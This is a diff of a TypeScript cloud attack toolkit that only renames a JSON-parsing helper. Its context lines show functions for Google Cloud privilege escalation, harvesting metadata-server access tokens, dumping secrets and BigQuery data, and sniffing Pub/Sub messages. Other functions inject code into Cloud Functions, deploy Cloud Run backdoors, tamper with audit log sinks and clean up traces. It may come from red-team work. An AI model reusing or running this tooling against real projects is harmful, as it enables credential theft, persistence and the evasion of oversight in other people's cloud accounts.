@@ -142,7 +142,7 @@ async function gcpEnum(args: string[], timeout: number): Promise<HookResult> {
   for (const [label, cmdArgs] of commands) {
     const r = await gcloud(cmdArgs, timeout)
     if (r.exitCode === 0) {
-      const items = tryParseJson(r.stdout)
+      const items = tryJson(r.stdout)
       const count = Array.isArray(items) ? items.length : items ? 1 : 0
       sections.push(`[+] ${label}: ${count} found`)
       if (hasFlag(args, "--format", "json")) sections.push(r.stdout)
@@ -189,7 +189,7 @@ async function gcpPrivesc(args: string[], timeout: number) {
   if (method === "set_iam_policy") {
     const r = await gcloud(["projects", "get-iam-policy", project, "--format=json"], timeout)
     if (r.exitCode !== 0) return `[-] Cannot read IAM policy: ${r.stderr.trim()}`
-    const policy = tryParseJson(r.stdout)
+    const policy = tryJson(r.stdout)
     const bindings = policy?.bindings || []
     const ownerBindings = bindings.filter(
       (b: { role: string }) => b.role === "roles/owner" || b.role === "roles/resourcemanager.projectIamAdmin",
@@ -288,7 +288,7 @@ async function metadataHarvestGcp() {
       }
       const text = await resp.text()
       if (name === "access_token") {
-        const parsed = tryParseJson(text)
+        const parsed = tryJson(text)
         output.push(
           `[+] ${name}: ${String(parsed?.access_token || "").slice(0, 20)}... (expires: ${parsed?.expires_in}s)`,
         )
@@ -318,7 +318,7 @@ async function secretsDumpGcp(args: string[], timeout: number) {
 
   const lr = await gcloud(["secrets", "list", "--project", project, "--format=json"], timeout)
   if (lr.exitCode !== 0) return `[-] Cannot list secrets: ${lr.stderr.trim()}`
-  const secrets = tryParseJson(lr.stdout) || []
+  const secrets = tryJson(lr.stdout) || []
   const output = [`[*] Found ${secrets.length} secret(s) in project ${project}\n`]
 
   for (const s of secrets) {
@@ -353,7 +353,7 @@ async function cloudfuncBackdoor(args: string[], timeout: number) {
       timeout,
     )
     if (r.exitCode !== 0) return `[-] Function not found: ${r.stderr.trim()}`
-    const func = tryParseJson(r.stdout)
+    const func = tryJson(r.stdout)
     return `[*] Function: ${funcName}\n[*] Runtime: ${func?.buildConfig?.runtime || "unknown"}\n[*] SA: ${func?.serviceConfig?.serviceAccountEmail || "default"}\n[*] Source: ${JSON.stringify(func?.buildConfig?.source?.storageSource || {})}\n[+] Ready for injection — download source, modify, and redeploy`
   }
 
@@ -370,11 +370,11 @@ async function auditLogTamper(args: string[], timeout: number) {
     const sinks = await gcloud(["logging", "sinks", "list", "--project", project, "--format=json"], timeout)
     const output = [`[*] Audit log status for ${project}\n`]
     if (policy.exitCode === 0) {
-      const p = tryParseJson(policy.stdout)
+      const p = tryJson(policy.stdout)
       output.push(`[+] Audit configs: ${(p?.auditConfigs || []).length}`)
     }
     if (sinks.exitCode === 0) {
-      const s = tryParseJson(sinks.stdout) || []
+      const s = tryJson(sinks.stdout) || []
       output.push(`[+] Log sinks: ${s.length}`)
       for (const sink of s) output.push(`    ${sink.name}: ${sink.destination}`)
     }
@@ -388,7 +388,7 @@ async function auditLogTamper(args: string[], timeout: number) {
   if (action === "modify_sink") {
     const sinks = await gcloud(["logging", "sinks", "list", "--project", project, "--format=json"], timeout)
     if (sinks.exitCode !== 0) return `[-] Cannot list sinks: ${sinks.stderr.trim()}`
-    const s = tryParseJson(sinks.stdout) || []
+    const s = tryJson(sinks.stdout) || []
     const output = [`[*] ${s.length} sink(s) found — modify with:\n`]
     for (const sink of s) {
       output.push(
@@ -474,7 +474,7 @@ async function cleanupGcp(args: string[], timeout: number) {
     timeout,
   )
   if (snapR.exitCode === 0) {
-    const snaps = tryParseJson(snapR.stdout) || []
+    const snaps = tryJson(snapR.stdout) || []
     output.push(`[+] Snapshots to clean: ${snaps.length}`)
     for (const s of snaps) {
       if (dryRun) {
@@ -488,7 +488,7 @@ async function cleanupGcp(args: string[], timeout: number) {
 
   const funcR = await gcloud(["functions", "list", "--filter=name~cs-", "--project", project, "--format=json"], timeout)
   if (funcR.exitCode === 0) {
-    const funcs = tryParseJson(funcR.stdout) || []
+    const funcs = tryJson(funcR.stdout) || []
     output.push(`[+] Functions to clean: ${funcs.length}`)
     for (const f of funcs) {
       const name = f.name?.split("/").pop() || f.name
@@ -506,7 +506,7 @@ async function cleanupGcp(args: string[], timeout: number) {
     timeout,
   )
   if (runR.exitCode === 0) {
-    const services = tryParseJson(runR.stdout) || []
+    const services = tryJson(runR.stdout) || []
     output.push(`[+] Cloud Run services to clean: ${services.length}`)
     for (const s of services) {
       const name = s.metadata?.name || s.name
@@ -525,7 +525,7 @@ async function cleanupGcp(args: string[], timeout: number) {
     timeout,
   )
   if (subR.exitCode === 0) {
-    const subs = tryParseJson(subR.stdout) || []
+    const subs = tryJson(subR.stdout) || []
     output.push(`[+] Pub/Sub subscriptions to clean: ${subs.length}`)
     for (const s of subs) {
       const name = s.name?.split("/").pop() || s.name
@@ -553,7 +553,7 @@ function hasFlag(args: string[], flag: string, value?: string): boolean {
   return args.includes(flag)
 }
 
-function tryParseJson(s: string) {
+function tryJson(s: string) {
   try {
     return JSON.parse(s)
   } catch {
@@ -572,7 +572,7 @@ async function bigqueryDump(args: string[], timeout: number): Promise<HookResult
   if (!dataset && !query) {
     const datasets = await run("bq", ["ls", "--project_id=" + project, "--format=json"], timeout)
     if (datasets.exitCode === 0) {
-      const items = tryParseJson(datasets.stdout) || []
+      const items = tryJson(datasets.stdout) || []
       output.push(`[+] Datasets: ${items.length}`)
       for (const d of items) output.push(`    ${d.datasetReference?.datasetId || d.id}`)
       findings.push({
@@ -597,7 +597,7 @@ async function bigqueryDump(args: string[], timeout: number): Promise<HookResult
   if (dataset && !query) {
     const tables = await run("bq", ["ls", "--format=json", `${project}:${dataset}`], timeout)
     if (tables.exitCode === 0) {
-      const items = tryParseJson(tables.stdout) || []
+      const items = tryJson(tables.stdout) || []
       output.push(`[+] Tables in ${dataset}: ${items.length}`)
       for (const t of items) {
         const ref = t.tableReference || {}
@@ -642,7 +642,7 @@ async function gkeEnum(args: string[], timeout: number): Promise<HookResult> {
   if (!cluster) {
     const list = await gcloud(["container", "clusters", "list", "--project", project, "--format=json"], timeout)
     if (list.exitCode === 0) {
-      const clusters = tryParseJson(list.stdout) || []
+      const clusters = tryJson(list.stdout) || []
       output.push(`[+] GKE clusters: ${clusters.length}`)
       for (const c of clusters) {
         output.push(
@@ -671,7 +671,7 @@ async function gkeEnum(args: string[], timeout: number): Promise<HookResult> {
     timeout,
   )
   if (show.exitCode === 0) {
-    const info = tryParseJson(show.stdout)
+    const info = tryJson(show.stdout)
     if (info) {
       output.push(`[+] Cluster: ${info.name}`)
       output.push(`    Master version: ${info.currentMasterVersion}`)
@@ -691,7 +691,7 @@ async function gkeEnum(args: string[], timeout: number): Promise<HookResult> {
     timeout,
   )
   if (nodePools.exitCode === 0) {
-    const pools = tryParseJson(nodePools.stdout) || []
+    const pools = tryJson(nodePools.stdout) || []
     output.push(`\n[+] Node pools: ${pools.length}`)
     for (const p of pools)
       output.push(
@@ -756,7 +756,7 @@ async function cloudRunBackdoor(args: string[], timeout: number): Promise<HookRe
       timeout,
     )
     if (deploy.exitCode === 0) {
-      const info = tryParseJson(deploy.stdout)
+      const info = tryJson(deploy.stdout)
       const url = info?.status?.url || ""
       output.push(`[+] Cloud Run service deployed: cs-${service}`)
       output.push(`    URL: ${url}`)
@@ -822,7 +822,7 @@ async function pubsubSniff(args: string[], timeout: number): Promise<HookResult>
   if (!topic) {
     const topics = await gcloud(["pubsub", "topics", "list", "--project", project, "--format=json"], timeout)
     if (topics.exitCode === 0) {
-      const items = tryParseJson(topics.stdout) || []
+      const items = tryJson(topics.stdout) || []
       output.push(`[+] Pub/Sub topics: ${items.length}`)
       for (const t of items) output.push(`    ${t.name}`)
       findings.push({
@@ -857,7 +857,7 @@ async function pubsubSniff(args: string[], timeout: number): Promise<HookResult>
     Math.max(timeout, duration + 10),
   )
   if (pull.exitCode === 0) {
-    const messages = tryParseJson(pull.stdout) || []
+    const messages = tryJson(pull.stdout) || []
     output.push(`[+] Messages captured: ${messages.length}`)
     for (const m of messages.slice(0, 20)) {
       const data = m.message?.data ? Buffer.from(m.message.data, "base64").toString() : ""
